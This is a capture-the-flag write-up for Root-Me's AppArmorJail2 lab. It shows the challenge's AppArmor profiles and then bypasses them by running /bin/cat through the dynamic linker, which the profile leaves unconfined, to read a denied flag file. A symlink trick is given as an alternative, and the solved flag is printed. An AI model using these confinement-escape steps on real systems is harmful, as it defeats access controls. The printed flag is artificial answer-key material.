# AppArmorJail2

## Description

> **Attention**: this challenge is available via the CTF-ATD "AppArmorJail2" machine. There is no /passwd file, so it is not possible to validate the machine on the CTF-ATD.

When connecting to the administrator’s server, a restricted shell via an AppArmor policy prevents you from reading the flag even though you are the owner...

Find a way to read the flag at any cost and override the AppArmor policy in place which is configured as follows:

```bash
#include <tunables/global>

profile docker_chall01 flags=(attach_disconnected,mediate_deleted) {
   #include <abstractions/base>
   network,
   capability,
   file,
   umount,
   signal (send,receive),
   deny mount,

   deny /sys/[^f]*/** wklx,
   deny /sys/f[^s]*/** wklx,
   deny /sys/fs/[^c]*/** wklx,
   deny /sys/fs/c[^g]*/** wklx,
   deny /sys/fs/cg[^r]*/** wklx,
   deny /sys/firmware/** rwklx,
   deny /sys/kernel/security/** rwklx,

   deny @{PROC}/* w,   # deny write for all files directly in /proc (not in a subdir)
   # deny write to files not in /proc/<number>/** or /proc/sys/**
   deny @{PROC}/{[^1-9],[^1-9][^0-9],[^1-9s][^0-9y][^0-9s],[^1-9][^0-9][^0-9][^0-9]*}/** w,
   deny @{PROC}/sys/[^k]** w,  # deny /proc/sys except /proc/sys/k* (effectively /proc/sys/kernel)
   deny @{PROC}/sys/kernel/{?,??,[^s][^h][^m]**} w,  # deny everything except shm* in /proc/sys/kernel/
   deny @{PROC}/sysrq-trigger rwklx,
   deny @{PROC}/kcore rwklx,

   /home/app-script-ch27/bash px -> bashprof1,
 
}
profile bashprof1 flags=(attach_disconnected,mediate_deleted) {
   #include <abstractions/base>
   #include <abstractions/bash>
   
   network,
   capability,
   deny mount,
   umount,
   signal (send,receive),

   deny /sys/[^f]*/** wklx,
   deny /sys/f[^s]*/** wklx,
   deny /sys/fs/[^c]*/** wklx,
   deny /sys/fs/c[^g]*/** wklx,
   deny /sys/fs/cg[^r]*/** wklx,
   deny /sys/firmware/** rwklx,
   deny /sys/kernel/security/** rwklx,

   deny @{PROC}/* w,   # deny write for all files directly in /proc (not in a subdir)
   # deny write to files not in /proc/<number>/** or /proc/sys/**
   deny @{PROC}/{[^1-9],[^1-9][^0-9],[^1-9s][^0-9y][^0-9s],[^1-9][^0-9][^0-9][^0-9]*}/** w,
   deny @{PROC}/sys/[^k]** w,  # deny /proc/sys except /proc/sys/k* (effectively /proc/sys/kernel)
   deny @{PROC}/sys/kernel/{?,??,[^s][^h][^m]**} w,  # deny everything except shm* in /proc/sys/kernel/
   deny @{PROC}/sysrq-trigger rwklx,
   deny @{PROC}/kcore rwklx,

   / r,
   /** mrwlk,
   /bin/** ix,
   /usr/bin/** ix,
   /lib/x86_64-linux-gnu/ld-*.so mrUx,
   deny /home/app-script-ch27/flag.txt r,
}
```

- Connect via SSH to the machine on port 22222 (app-script-ch27:app-script-ch27)
- The challenge validation password is in the /home/app-script-ch27/flag.txt file
- The validation password of the CTF ATD is in the file /passwd

## Research

AppArmor (Application Armor) is a Linux security module that confines applications using per-program profiles. Unlike SELinux, which uses a complex labeling system, AppArmor is path-based, making it simpler to configure while still offering effective application confinement.

### What is an AppArmor Jail?

An **AppArmor Jail** refers to the confinement of a process within a restricted security profile, preventing it from accessing unauthorized system resources. This is useful for:

- Containing potentially vulnerable applications.
- Restricting access to system files and network resources.
- Preventing privilege escalation.

### How AppArmor Jails Work

1. **Profile-Based Restrictions**
    - Each application is assigned an AppArmor profile (enforced or complain mode).
    - Profiles define allowed and denied operations, such as file access, network usage, and capabilities.
2. **Mandatory Access Control (MAC)**
    - Unlike traditional discretionary access control (DAC), AppArmor enforces policies even for privileged users.
3. **Path-Based Confinement**
    - Restrictions apply to specific binaries rather than labels, making management easier.


[Aaron Jones: Introduction To Firejail, AppArmor, and SELinux](https://www.youtube.com/watch?v=JFjXvIwAeVI)
- [https://retro64xyz.gitlab.io/presentations/2018/10/16/firejail-and-apparmor/#apparmor](https://retro64xyz.gitlab.io/presentations/2018/10/16/firejail-and-apparmor/#apparmor)

[https://wiki.archlinux.org/title/AppArmor](https://wiki.archlinux.org/title/AppArmor)
- [https://archive.is/sVHnu](https://archive.is/sVHnu) (Something was wrong with templating (2025-03-01), view properly from archive.is)

[https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/apparmor](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/apparmor)

## Solution

Increase verbosity on given profiles:
```bash
#include <tunables/global>

profile docker_chall01 flags=(attach_disconnected,mediate_deleted) {
   # Include base abstractions for standard permissions
   # This includes basic file, network, and capability rules
   # Includes common system access rules
   #include <abstractions/base>

   # Allow network access
   network,
   
   # Allow capability-related operations
   capability,
   
   # Allow general file operations
   file,
   
   # Allow unmounting filesystems
   umount,
   
   # Allow sending and receiving signals
   signal (send,receive),
   
   # Explicitly deny mounting new filesystems
   deny mount,

   # Deny writing, creating, linking, or executing in restricted /sys directories
   deny /sys/[^f]*/** wklx,  # Deny /sys except those starting with 'f'
   deny /sys/f[^s]*/** wklx,  # Deny /sys/f* except /sys/fs
   deny /sys/fs/[^c]*/** wklx,  # Deny /sys/fs except those starting with 'c'
   deny /sys/fs/c[^g]*/** wklx,  # Deny /sys/fs/c* except /sys/fs/cg
   deny /sys/fs/cg[^r]*/** wklx,  # Deny /sys/fs/cg* except /sys/fs/cgr
   deny /sys/firmware/** rwklx,  # Restrict access to firmware
   deny /sys/kernel/security/** rwklx,  # Restrict access to kernel security interfaces

   # Restrict access to /proc filesystem
   deny @{PROC}/* w,  # Deny writing directly inside /proc (not in a subdir)
   
   # Deny writing to files outside specific /proc subdirectories
   deny @{PROC}/{[^1-9],[^1-9][^0-9],[^1-9s][^0-9y][^0-9s],[^1-9][^0-9][^0-9][^0-9]*}/** w,
   
   # Restrict /proc/sys except kernel configurations
   deny @{PROC}/sys/[^k]** w,
   deny @{PROC}/sys/kernel/{?,??,[^s][^h][^m]**} w,  # Only allow shm* in /proc/sys/kernel
   
   # Restrict access to certain sensitive files in /proc
   deny @{PROC}/sysrq-trigger rwklx,
   deny @{PROC}/kcore rwklx,

   # Allow execution of bash profile
   /home/app-script-ch27/bash px -> bashprof1,
}

profile bashprof1 flags=(attach_disconnected,mediate_deleted) {
   # Base and Bash-specific abstractions for basic shell operation
   #include <abstractions/base>
   #include <abstractions/bash>
   
   # Allow network access
   network,
   
   # Allow capability-related operations
   capability,
   
   # Explicitly deny mounting new filesystems
   deny mount,
   
   # Allow unmounting
   umount,
   
   # Allow sending and receiving signals
   signal (send,receive),
   
   # Deny writing, creating, linking, or executing in restricted /sys directories
   deny /sys/[^f]*/** wklx,
   deny /sys/f[^s]*/** wklx,
   deny /sys/fs/[^c]*/** wklx,
   deny /sys/fs/c[^g]*/** wklx,
   deny /sys/fs/cg[^r]*/** wklx,
   deny /sys/firmware/** rwklx,
   deny /sys/kernel/security/** rwklx,
   
   # Restrict access to /proc filesystem
   deny @{PROC}/* w,
   deny @{PROC}/{[^1-9],[^1-9][^0-9],[^1-9s][^0-9y][^0-9s],[^1-9][^0-9][^0-9][^0-9]*}/** w,
   deny @{PROC}/sys/[^k]** w,
   deny @{PROC}/sys/kernel/{?,??,[^s][^h][^m]**} w,
   deny @{PROC}/sysrq-trigger rwklx,
   deny @{PROC}/kcore rwklx,
   
   # Allow read access to root filesystem
   / r,
   
   # Allow full file access within root filesystem
   /** mrwlk,
   
   # Allow execution of binaries
   /bin/** ix,
   /usr/bin/** ix,
   
   # Allow execution of shared libraries
   /lib/x86_64-linux-gnu/ld-*.so mrUx,
   
   # Explicitly deny read access to flag.txt
   deny /home/app-script-ch27/flag.txt r,
}
```

Connect to box (username is password)
```powershell
➜ ssh ctf11.root-me.org -l app-script-ch27 -p 22222
```

Directly trying to read file fails, symlink fails, no mount permissions, subshells don't work, can't execute `bash` in current directory, etc...

After looking over the rules something stood out. 
- **ix** (inherit execution) for binaries like cat execute under AppArmor restrictions.
- **mrUx** (memory-read, execute, unconfined execution) for ld-linux-x86-64.so.2 allows direct execution without AppArmor confinement.

```bash
# Allow execution of binaries
/bin/** ix,
/usr/bin/** ix,

# Allow execution of shared libraries
/lib/x86_64-linux-gnu/ld-*.so mrUx,
```

This works because we are bypassing AppArmor's execution restrictions by explicitly invoking the **dynamic linker (`ld-linux-x86-64.so.2`)**

Source: [QUENTIN R.A. / Cybersecurity / Blue team / ⚒️ Tools / Hardening / AppArmor / index.md](https://blog.quentinra.dev/cybersecurity/blue-team/tools/hardening/apparmor/index.md)

```bash
app-script-ch27@e3deb9f9cb2e:~$ ls -lh /lib/x86_64-linux-gnu/ld*
-rwxr-xr-x 1 root root 175K May  3  2022 /lib/x86_64-linux-gnu/ld-2.27.so
lrwxrwxrwx 1 root root   10 May  3  2022 /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 -> ld-2.27.so
app-script-ch27@e3deb9f9cb2e:~$ /lib/x86_64-linux-gnu/ld-2.27.so /bin/cat flag.txt
M4nd4t0ry_4cc3ss_C0ntr0l_J0k3
app-script-ch27@e3deb9f9cb2e:~$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/cat flag.txt
M4nd4t0ry_4cc3ss_C0ntr0l_J0k3
```

> Flag: `M4nd4t0ry_4cc3ss_C0ntr0l_J0k3`

---

Alternative solution includes replacing restricted bash with actual bash: `ln -sf /bin/bash /home/app-script-ch27/bash`, this will require you to re-ssh into the box; process will invoke `bash` in user's home directory, but actually run `/bin/bash` because of symlink.

